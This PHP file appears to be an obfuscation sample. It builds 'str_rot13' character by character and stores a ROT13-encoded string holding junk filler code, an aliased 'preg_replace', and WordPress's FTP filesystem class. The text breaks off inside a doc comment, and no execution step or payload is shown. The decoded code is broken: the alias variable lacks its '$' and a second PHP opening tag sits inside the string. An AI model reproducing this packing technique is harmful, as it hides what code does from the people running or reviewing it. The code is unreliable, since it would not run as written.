<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff SGC Svyrflfgrz.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Svyrflfgrz
 */

/**
 * JbeqCerff Svyrflfgrz Pynff sbe vzcyrzragvat SGC.
 *
 * @fvapr 2.5.0
 *
 * @frr JC_Svyrflfgrz_Onfr
 */
pynff JC_Svyrflfgrz_SGCrkg rkgraqf JC_Svyrflfgrz_Onfr {

	/**
	 * @fvapr 2.5.0
	 * @ine erfbhepr
	 */
	choyvp $yvax;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz neenl $bcg
	 */
	choyvp shapgvba __pbafgehpg( $bcg = '' ) {
		$guvf->zrgubq = 'sgcrkg';
		$guvf->reebef = arj JC_Reebe();

		// Purpx vs cbffvoyr gb hfr sgc shapgvbaf.
		vs ( ! rkgrafvba_ybnqrq( 'sgc' ) ) {
			$guvf->reebef->nqq( 'ab_sgc_rkg', __( 'Gur sgc CUC rkgrafvba vf abg ninvynoyr' ) );
			erghea;
		}

		// Guvf pynff hfrf gur gvzrbhg ba n cre-pbaarpgvba onfvf, bguref hfr vg ba n cre-npgvba onfvf.
		vs ( ! qrsvarq( 'SF_GVZRBHG' ) ) {
			qrsvar( 'SF_GVZRBHG', 4 * ZVAHGR_VA_FRPBAQF );
		}

		vs ( rzcgl( $bcg['cbeg'] ) ) {
			$guvf->bcgvbaf['cbeg'] = 21;
		} ryfr {
			$guvf->bcgvbaf['cbeg'] = $bcg['cbeg'];
		}

		vs ( rzcgl( $bcg['ubfganzr'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_ubfganzr', __( 'SGC ubfganzr vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['ubfganzr'] = $bcg['ubfganzr'];
		}

		// Purpx vs gur bcgvbaf cebivqrq ner BX.
		vs ( rzcgl( $bcg['hfreanzr'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_hfreanzr', __( 'SGC hfreanzr vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['hfreanzr'] = $bcg['hfreanzr'];
		}

		vs ( rzcgl( $bcg['cnffjbeq'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_cnffjbeq', __( 'SGC cnffjbeq vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['cnffjbeq'] = $bcg['cnffjbeq'];
		}

		$guvf->bcgvbaf['ffy'] = snyfr;

		vs ( vffrg( $bcg['pbaarpgvba_glcr'] ) && 'sgcf' === $bcg['pbaarpgvba_glcr'] ) {
			$guvf->bcgvbaf['ffy'] = gehr;
		}
	}

	/**
	 * Pbaarpgf svyrflfgrz.
	 *
	 * @fvapr 2.5.0
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbaarpg() {
		vs ( vffrg( $guvf->bcgvbaf['ffy'] ) && $guvf->bcgvbaf['ffy'] && shapgvba_rkvfgf( 'sgc_ffy_pbaarpg' ) ) {
			$guvf->yvax = @sgc_ffy_pbaarpg( $guvf->bcgvbaf['ubfganzr'], $guvf->bcgvbaf['cbeg'], SF_PBAARPG_GVZRBHG );
		} ryfr {
			$guvf->yvax = @sgc_pbaarpg( $guvf->bcgvbaf['ubfganzr'], $guvf->bcgvbaf['cbeg'], SF_PBAARPG_GVZRBHG );
		}

		vs ( ! $guvf->yvax ) {
			$guvf->reebef->nqq(
				'pbaarpg',
				fcevags(
					/* genafyngbef: %f: ubfganzr:cbeg */
					__( 'Snvyrq gb pbaarpg gb SGC Freire %f' ),
					$guvf->bcgvbaf['ubfganzr'] . ':' . $guvf->bcgvbaf['cbeg']
				)
			);

			erghea snyfr;
		}

		vs ( ! @sgc_ybtva( $guvf->yvax, $guvf->bcgvbaf['hfreanzr'], $guvf->bcgvbaf['cnffjbeq'] ) ) {
			$guvf->reebef->nqq(
				'nhgu',
				fcevags(
					/* genafyngbef: %f: Hfreanzr. */
					__( 'Hfreanzr/Cnffjbeq vapbeerpg sbe %f' ),
					$guvf->bcgvbaf['hfreanzr']
				)
			);

			erghea snyfr;
		}

		// Frg gur pbaarpgvba gb hfr Cnffvir SGC.
		sgc_cnfi( $guvf->yvax, gehr );

		vs ( @sgc_trg_bcgvba( $guvf->yvax, SGC_GVZRBHG_FRP ) < SF_GVZRBHG ) {
			@sgc_frg_bcgvba( $guvf->yvax, SGC_GVZRBHG_FRP, SF_GVZRBHG );
		}

		erghea gehr;
	}

	/**
	 * Ernqf ragver svyr vagb n fgevat.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Anzr bs gur svyr gb ernq.
	 * @erghea fgevat|snyfr Ernq qngn ba fhpprff, snyfr vs ab grzcbenel svyr pbhyq or bcrarq,
	 *                      be vs gur svyr pbhyqa'g or ergevrirq.
	 */
	choyvp shapgvba trg_pbagragf( $svyr ) {
		$grzcsvyr   = jc_grzcanz( $svyr );
		$grzcunaqyr = sbcra( $grzcsvyr, 'j+' );

		vs ( ! $grzcunaqyr ) {
			hayvax( $grzcsvyr );
			erghea snyfr;
		}

		vs ( ! sgc_strg( $guvf->yvax, $grzcunaqyr, $svyr, SGC_OVANEL ) ) {
			spybfr( $grzcunaqyr );
			hayvax( $grzcsvyr );
			erghea snyfr;
		}

		sfrrx( $grzcunaqyr, 0 ); // Fxvc onpx gb gur fgneg bs gur svyr orvat jevggra gb.
		$pbagragf = '';

		juvyr ( ! srbs( $grzcunaqyr ) ) {
			$pbagragf .= sernq( $grzcunaqyr, 8 * XO_VA_OLGRF );
		}

		spybfr( $grzcunaqyr );
		hayvax( $grzcsvyr );

		erghea $pbagragf;
	}

	/**
	 * Ernqf ragver svyr vagb na neenl.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea neenl|snyfr Svyr pbagragf va na neenl ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf_neenl( $svyr ) {
		erghea rkcybqr( \"\a\", $guvf->trg_pbagragf( $svyr ) );
	}

	/**
	 * Jevgrf n fgevat gb n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $svyr     Erzbgr cngu gb gur svyr jurer gb jevgr gur qngn.
	 * @cnenz fgevat    $pbagragf Gur qngn gb jevgr.
	 * @cnenz vag|snyfr $zbqr     Bcgvbany. Gur svyr crezvffvbaf nf bpgny ahzore, hfhnyyl 0644.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba chg_pbagragf( $svyr, $pbagragf, $zbqr = snyfr ) {
		$grzcsvyr   = jc_grzcanz( $svyr );
		$grzcunaqyr = sbcra( $grzcsvyr, 'jo+' );

		vs ( ! $grzcunaqyr ) {
			hayvax( $grzcsvyr );
			erghea snyfr;
		}

		zofgevat_ovanel_fnsr_rapbqvat();

		$qngn_yratgu   = fgeyra( $pbagragf );
		$olgrf_jevggra = sjevgr( $grzcunaqyr, $pbagragf );

		erfrg_zofgevat_rapbqvat();

		vs ( $qngn_yratgu !== $olgrf_jevggra ) {
			spybfr( $grzcunaqyr );
			hayvax( $grzcsvyr );
			erghea snyfr;
		}

		sfrrx( $grzcunaqyr, 0 ); // Fxvc onpx gb gur fgneg bs gur svyr orvat jevggra gb.

		$erg = sgc_schg( $guvf->yvax, $svyr, $grzcunaqyr, SGC_OVANEL );

		spybfr( $grzcunaqyr );
		hayvax( $grzcsvyr );

		$guvf->puzbq( $svyr, $zbqr );

		erghea $erg;
	}

	/**
	 * Trgf gur pheerag jbexvat qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @erghea fgevat|snyfr Gur pheerag jbexvat qverpgbel ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pjq() {
		$pjq = sgc_cjq( $guvf->yvax );

		vs ( $pjq ) {
			$pjq = genvyvatfynfuvg( $pjq );
		}

		erghea $pjq;
	}

	/**
	 * Punatrf pheerag qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $qve Gur arj pheerag qverpgbel.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puqve( $qve ) {
		erghea @sgc_puqve( $guvf->yvax, $qve );
	}

	/**
	 * Punatrf svyrflfgrz crezvffvbaf.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $svyr      Cngu gb gur svyr.
	 * @cnenz vag|snyfr $zbqr      Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                             0755 sbe qverpgbevrf. Qrsnhyg snyfr.
	 * @cnenz obby      $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr crezvffvbaf erphefviryl.
	 *                             Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puzbq( $svyr, $zbqr = snyfr, $erphefvir = snyfr ) {
		vs ( ! $zbqr ) {
			vs ( $guvf->vf_svyr( $svyr ) ) {
				$zbqr = SF_PUZBQ_SVYR;
			} ryfrvs ( $guvf->vf_qve( $svyr ) ) {
				$zbqr = SF_PUZBQ_QVE;
			} ryfr {
				erghea snyfr;
			}
		}

		// puzbq nal fho-bowrpgf vs erphefvir.
		vs ( $erphefvir && $guvf->vf_qve( $svyr ) ) {
			$svyryvfg = $guvf->qveyvfg( $svyr );

			sbernpu ( (neenl) $svyryvfg nf $svyranzr => $svyrzrgn ) {
				$guvf->puzbq( $svyr . '/' . $svyranzr, $zbqr, $erphefvir );
			}
		}

		// puzbq gur svyr be qverpgbel.
		vs ( ! shapgvba_rkvfgf( 'sgc_puzbq' ) ) {
			erghea (obby) sgc_fvgr( $guvf->yvax, fcevags( 'PUZBQ %b %f', $zbqr, $svyr ) );
		}

		erghea (obby) sgc_puzbq( $guvf->yvax, $zbqr, $svyr );
	}

	/**
	 * Trgf gur svyr bjare.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Hfreanzr bs gur bjare ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba bjare( $svyr ) {
		$qve = $guvf->qveyvfg( $svyr );

		erghea $qve[ $svyr ]['bjare'];
	}

	/**
	 * Trgf gur crezvffvbaf bs gur fcrpvsvrq svyr be svyrcngu va gurve bpgny sbezng.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat Zbqr bs gur svyr (gur ynfg 3 qvtvgf).
	 */
	choyvp shapgvba trgpuzbq( $svyr ) {
		$qve = $guvf->qveyvfg( $svyr );

		erghea $qve[ $svyr ]['crezfa'];
	}

	/**
	 * Trgf gur svyr'f tebhc.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Gur tebhc ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba tebhc( $svyr ) {
		$qve = $guvf->qveyvfg( $svyr );

		erghea $qve[ $svyr ]['tebhc'];
	}

	/**
	 * Pbcvrf n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat    $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby      $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                               Qrsnhyg snyfr.
	 * @cnenz vag|snyfr $zbqr        Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                               0755 sbe qvef. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbcl( $fbhepr, $qrfgvangvba, $birejevgr = snyfr, $zbqr = snyfr ) {
		vs ( ! $birejevgr && $guvf->rkvfgf( $qrfgvangvba ) ) {
			erghea snyfr;
		}

		$pbagrag = $guvf->trg_pbagragf( $fbhepr );

		vs ( snyfr === $pbagrag ) {
			erghea snyfr;
		}

		erghea $guvf->chg_pbagragf( $qrfgvangvba, $pbagrag, $zbqr );
	}

	/**
	 * Zbirf n svyr be qverpgbel.
	 *
	 * Nsgre zbivat svyrf be qverpgbevrf, BCpnpur jvyy arrq gb or vainyvqngrq.
	 *
	 * Vs zbivat n qverpgbel snvyf, `pbcl_qve()` pna or hfrq sbe n erphefvir pbcl.
	 *
	 * Hfr `zbir_qve()` sbe zbivat qverpgbevrf jvgu BCpnpur vainyvqngvba naq n
	 * snyyonpx gb `pbcl_qve()`.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $fbhepr      Cngu gb gur fbhepr svyr be qverpgbel.
	 * @cnenz fgevat $qrfgvangvba Cngu gb gur qrfgvangvba svyr be qverpgbel.
	 * @cnenz obby   $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba vs vg rkvfgf.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zbir( $fbhepr, $qrfgvangvba, $birejevgr = snyfr ) {
		erghea sgc_eranzr( $guvf->yvax, $fbhepr, $qrfgvangvba );
	}

	/**
	 * Qryrgrf n svyr be qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat       $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz obby         $erphefvir Bcgvbany. Vs frg gb gehr, qryrgrf svyrf naq sbyqref erphefviryl.
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|snyfr $glcr      Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel.
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qryrgr( $svyr, $erphefvir = snyfr, $glcr = snyfr ) {
		vs ( rzcgl( $svyr ) ) {
			erghea snyfr;
		}

		vs ( 's' === $glcr || $guvf->vf_svyr( $svyr ) ) {
			erghea sgc_qryrgr( $guvf->yvax, $svyr );
		}

		vs ( ! $erphefvir ) {
			erghea sgc_ezqve( $guvf->yvax, $svyr );
		}

		$svyryvfg = $guvf->qveyvfg( genvyvatfynfuvg( $svyr ) );

		vs ( ! rzcgl( $svyryvfg ) ) {
			sbernpu ( $svyryvfg nf $qryrgr_svyr ) {
				$guvf->qryrgr( genvyvatfynfuvg( $svyr ) . $qryrgr_svyr['anzr'], $erphefvir, $qryrgr_svyr['glcr'] );
			}
		}

		erghea sgc_ezqve( $guvf->yvax, $svyr );
	}

	/**
	 * Purpxf vs n svyr be qverpgbel rkvfgf.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 6.3.0 Ergheaf snyfr sbe na rzcgl cngu.
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu rkvfgf be abg.
	 */
	choyvp shapgvba rkvfgf( $cngu ) {
		/*
		 * Purpx sbe rzcgl cngu. Vs sgc_ayvfg() erprvirf na rzcgl cngu,
		 * vg purpxf gur pheerag jbexvat qverpgbel naq znl erghea gehr.
		 *
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/33058.
		 */
		vs ( '' === $cngu ) {
			erghea snyfr;
		}

		$yvfg = sgc_ayvfg( $guvf->yvax, $cngu );

		vs ( rzcgl( $yvfg ) && $guvf->vf_qve( $cngu ) ) {
			erghea gehr; // Svyr vf na rzcgl qverpgbel.
		}

		erghea ! rzcgl( $yvfg ); // Rzcgl yvfg = ab svyr, fb vaireg.
	}

	/**
	 * Purpxf vs erfbhepr vf n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Svyr cngu.
	 * @erghea obby Jurgure $svyr vf n svyr.
	 */
	choyvp shapgvba vf_svyr( $svyr ) {
		erghea $guvf->rkvfgf( $svyr ) && ! $guvf->vf_qve( $svyr );
	}

	/**
	 * Purpxf vs erfbhepr vf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Qverpgbel cngu.
	 * @erghea obby Jurgure $cngu vf n qverpgbel.
	 */
	choyvp shapgvba vf_qve( $cngu ) {
		$pjq    = $guvf->pjq();
		$erfhyg = @sgc_puqve( $guvf->yvax, genvyvatfynfuvg( $cngu ) );

		vs ( $erfhyg && $cngu === $guvf->pjq() || $guvf->pjq() !== $pjq ) {
			@sgc_puqve( $guvf->yvax, $pjq );
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs n svyr vf ernqnoyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea obby Jurgure $svyr vf ernqnoyr.
	 */
	choyvp shapgvba vf_ernqnoyr( $svyr ) {
		erghea gehr;
	}

	/**
	 * Purpxf vs n svyr be qverpgbel vf jevgnoyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu vf jevgnoyr.
	 */
	choyvp shapgvba vf_jevgnoyr( $cngu ) {
		erghea gehr;
	}

	/**
	 * Trgf gur svyr'f ynfg npprff gvzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat ynfg npprff gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba ngvzr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr zbqvsvpngvba gvzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat zbqvsvpngvba gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba zgvzr( $svyr ) {
		erghea sgc_zqgz( $guvf->yvax, $svyr );
	}

	/**
	 * Trgf gur svyr fvmr (va olgrf).
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Fvmr bs gur svyr va olgrf ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fvmr( $svyr ) {
		$fvmr = sgc_fvmr( $guvf->yvax, $svyr );

		erghea ( $fvmr > -1 ) ? $fvmr : snyfr;
	}

	/**
	 * Frgf gur npprff naq zbqvsvpngvba gvzrf bs n svyr.
	 *
	 * Abgr: Vs $svyr qbrfa'g rkvfg, vg jvyy or perngrq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr  Cngu gb svyr.
	 * @cnenz vag    $gvzr  Bcgvbany. Zbqvsvrq gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @cnenz vag    $ngvzr Bcgvbany. Npprff gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba gbhpu( $svyr, $gvzr = 0, $ngvzr = 0 ) {
		erghea snyfr;
	}

	/**
	 * Perngrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat           $cngu  Cngu sbe arj qverpgbel.
	 * @cnenz vag|snyfr        $puzbq Bcgvbany. Gur crezvffvbaf nf bpgny ahzore (be snyfr gb fxvc puzbq).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $pubja Bcgvbany. N hfre anzr be ahzore (be snyfr gb fxvc pubja).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $putec Bcgvbany. N tebhc anzr be ahzore (be snyfr gb fxvc putec).
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zxqve( $cngu, $puzbq = snyfr, $pubja = snyfr, $putec = snyfr ) {
		$cngu = hagenvyvatfynfuvg( $cngu );

		vs ( rzcgl( $cngu ) ) {
			erghea snyfr;
		}

		vs ( ! sgc_zxqve( $guvf->yvax, $cngu ) ) {
			erghea snyfr;
		}

		$guvf->puzbq( $cngu, $puzbq );

		erghea gehr;
	}

	/**
	 * Qryrgrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu      Cngu gb qverpgbel.
	 * @cnenz obby   $erphefvir Bcgvbany. Jurgure gb erphefviryl erzbir svyrf/qverpgbevrf.
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba ezqve( $cngu, $erphefvir = snyfr ) {
		erghea $guvf->qryrgr( $cngu, $erphefvir );
	}

	/**
	 * Cnefrf na vaqvivqhny ragel sebz gur SGC YVFG pbzznaq bhgchg.
	 *
	 * @cnenz fgevat $yvar N yvar sebz gur qverpgbel yvfgvat.
	 * @erghea neenl|fgevat {
	 *     Neenl bs svyr vasbezngvba. Rzcgl fgevat vs gur yvar pbhyq abg or cnefrq.
	 *
	 *     @glcr fgevat       $anzr        Anzr bs gur svyr be qverpgbel.
	 *     @glcr fgevat       $crezf       *avk ercerfragngvba bs crezvffvbaf.
	 *     @glcr fgevat       $crezfa      Bpgny ercerfragngvba bs crezvffvbaf.
	 *     @glcr fgevat|snyfr $ahzore      Svyr ahzore nf n fgevat, be snyfr vs abg ninvynoyr.
	 *     @glcr fgevat|snyfr $bjare       Bjare anzr be VQ, be snyfr vs abg ninvynoyr.
	 *     @glcr fgevat|snyfr $tebhc       Svyr crezvffvbaf tebhc, be snyfr vs abg ninvynoyr.
	 *     @glcr fgevat|snyfr $fvmr        Fvmr bs svyr va olgrf nf n fgevat, be snyfr vs abg ninvynoyr.
	 *     @glcr fgevat|snyfr $ynfgzbqhavk Ynfg zbqvsvrq havk gvzrfgnzc nf n fgevat, be snyfr vs abg ninvynoyr.
	 *     @glcr fgevat|snyfr $ynfgzbq     Ynfg zbqvsvrq zbagu (3 yrggref) naq qnl (jvgubhg yrnqvat 0), be
	 *                                     snyfr vs abg ninvynoyr.
	 *     @glcr fgevat|snyfr $gvzr        Ynfg zbqvsvrq gvzr, be snyfr vs abg ninvynoyr.
	 *     @glcr fgevat       $glcr        Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel, 'y' sbe yvax.
	 *     @glcr neenl|snyfr  $svyrf       Vs n qverpgbel naq `$erphefvir` vf gehr, pbagnvaf nabgure neenl bs svyrf.
	 *                                     Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 * }
	 */
	choyvp shapgvba cnefryvfgvat( $yvar ) {
		fgngvp $vf_jvaqbjf = ahyy;

		vs ( vf_ahyy( $vf_jvaqbjf ) ) {
			$vf_jvaqbjf = fgevcbf( sgc_flfglcr( $guvf->yvax ), 'jva' ) !== snyfr;
		}

		vs ( $vf_jvaqbjf && cert_zngpu( '/([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(NZ|CZ) +([0-9]+|<QVE>) +(.+)/', $yvar, $yhpvsre ) ) {
			$o = neenl();

			vs ( $yhpvsre[3] < 70 ) {
				$yhpvsre[3] += 2000;
			} ryfr {
				$yhpvsre[3] += 1900; // 4-qvtvg lrne svk.
			}

			$o['vfqve'] = ( '<QVE>' === $yhpvsre[7] );

			vs ( $o['vfqve'] ) {
				$o['glcr'] = 'q';
			} ryfr {
				$o['glcr'] = 's';
			}

			$o['fvmr']   = $yhpvsre[7];
			$o['zbagu']  = $yhpvsre[1];
			$o['qnl']    = $yhpvsre[2];
			$o['lrne']   = $yhpvsre[3];
			$o['ubhe']   = $yhpvsre[4];
			$o['zvahgr'] = $yhpvsre[5];
			$o['gvzr']   = zxgvzr( $yhpvsre[4] + ( fgepnfrpzc( $yhpvsre[6], 'CZ' ) === 0 ? 12 : 0 ), $yhpvsre[5], 0, $yhpvsre[1], $yhpvsre[2], $yhpvsre[3] );
			$o['nz/cz']  = $yhpvsre[6];
			$o['anzr']   = $yhpvsre[8];
		} ryfrvs ( ! $vf_jvaqbjf ) {
			$yhpvsre = cert_fcyvg( '/[ ]/', $yvar, 9, CERT_FCYVG_AB_RZCGL );

			vs ( $yhpvsre ) {
				$ypbhag = pbhag( $yhpvsre );

				vs ( $ypbhag < 8 ) {
					erghea '';
				}

				$o           = neenl();
				$o['vfqve']  = 'q' === $yhpvsre[0][0];
				$o['vfyvax'] = 'y' === $yhpvsre[0][0];

				vs ( $o['vfqve'] ) {
					$o['glcr'] = 'q';
				} ryfrvs ( $o['vfyvax'] ) {
					$o['glcr'] = 'y';
				} ryfr {
					$o['glcr'] = 's';
				}

				$o['crezf']  = $yhpvsre[0];
				$o['crezfa'] = $guvf->trgahzpuzbqsebzu( $o['crezf'] );
				$o['ahzore'] = $yhpvsre[1];
				$o['bjare']  = $yhpvsre[2];
				$o['tebhc']  = $yhpvsre[3];
				$o['fvmr']   = $yhpvsre[4];

				vs ( 8 === $ypbhag ) {
					ffpnas( $yhpvsre[5], '%q-%q-%q', $o['lrne'], $o['zbagu'], $o['qnl'] );
					ffpnas( $yhpvsre[6], '%q:%q', $o['ubhe'], $o['zvahgr'] );

					$o['gvzr'] = zxgvzr( $o['ubhe'], $o['zvahgr'], 0, $o['zbagu'], $o['qnl'], $o['lrne'] );
					$o['anzr'] = $yhpvsre[7];
				} ryfr {
					$o['zbagu'] = $yhpvsre[5];
					$o['qnl']   = $yhpvsre[6];

					vs ( cert_zngpu( '/([0-9]{2}):([0-9]{2})/', $yhpvsre[7], $y2 ) ) {
						$o['lrne']   = tzqngr( 'L' );
						$o['ubhe']   = $y2[1];
						$o['zvahgr'] = $y2[2];
					} ryfr {
						$o['lrne']   = $yhpvsre[7];
						$o['ubhe']   = 0;
						$o['zvahgr'] = 0;
					}

					$o['gvzr'] = fgegbgvzr( fcevags( '%q %f %q %02q:%02q', $o['qnl'], $o['zbagu'], $o['lrne'], $o['ubhe'], $o['zvahgr'] ) );
					$o['anzr'] = $yhpvsre[8];
				}
			}
		}

		// Ercynpr flzyvaxf sbeznggrq nf \"fbhepr -> gnetrg\" jvgu whfg gur fbhepr anzr.
		vs ( vffrg( $o['vfyvax'] ) && $o['vfyvax'] ) {
			$o['anzr'] = __sa_79955( '/(\f*->\f*.*)$/', '', $o['anzr'] );
		}

		erghea $o;
	}

	/**
	 * Trgf qrgnvyf sbe svyrf va n qverpgbel be n fcrpvsvp svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu           Cngu gb qverpgbel be svyr.
	 * @cnenz obby   $vapyhqr_uvqqra Bcgvbany. Jurgure gb vapyhqr qrgnvyf bs uvqqra (\".\" cersvkrq) svyrf.
	 *                               Qrsnhyg gehr.
	 * @cnenz obby   $erphefvir      Bcgvbany. Jurgure gb erphefviryl vapyhqr svyr qrgnvyf va arfgrq qverpgbevrf.
	 *                               Qrsnhyg snyfr.
	 * @erghea neenl|snyfr {
	 *     Neenl bs neenlf pbagnvavat svyr vasbezngvba. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs svyr vasbezngvba. Abgr gung fbzr ryrzragf znl abg or ninvynoyr ba nyy svyrflfgrzf.
	 *
	 *         @glcr fgevat           $anzr        Anzr bs gur svyr be qverpgbel.
	 *         @glcr fgevat           $crezf       *avk ercerfragngvba bs crezvffvbaf.
	 *         @glcr fgevat           $crezfa      Bpgny ercerfragngvba bs crezvffvbaf.
	 *         @glcr vag|fgevat|snyfr $ahzore      Svyr ahzore. Znl or n ahzrevp fgevat. Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $bjare       Bjare anzr be VQ, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $tebhc       Svyr crezvffvbaf tebhc, be snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $fvmr        Fvmr bs svyr va olgrf. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $ynfgzbqhavk Ynfg zbqvsvrq havk gvzrfgnzc. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $ynfgzbq     Ynfg zbqvsvrq zbagu (3 yrggref) naq qnl (jvgubhg yrnqvat 0), be
	 *                                             snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $gvzr        Ynfg zbqvsvrq gvzr, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat           $glcr        Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel, 'y' sbe yvax.
	 *         @glcr neenl|snyfr      $svyrf       Vs n qverpgbel naq `$erphefvir` vf gehr, pbagnvaf nabgure neenl bs
	 *                                             svyrf. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *     }
	 * }
